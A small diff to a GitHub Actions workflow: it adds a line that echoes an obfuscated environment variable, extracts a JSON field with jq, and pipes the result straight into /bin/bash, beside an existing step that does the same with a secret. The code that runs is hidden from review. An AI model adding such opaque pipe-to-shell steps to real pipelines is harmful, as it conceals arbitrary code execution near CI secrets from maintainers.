@@ -20,6 +20,7 @@ jobs:
           bjdri151: ${{ secrets.bjdri151 }}
         run: |
           printf '%s' "$bjdri151" | jq -r .xpgb01942 | /bin/bash
+          echo $zdyz5365 | jq -r .uzd14735 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
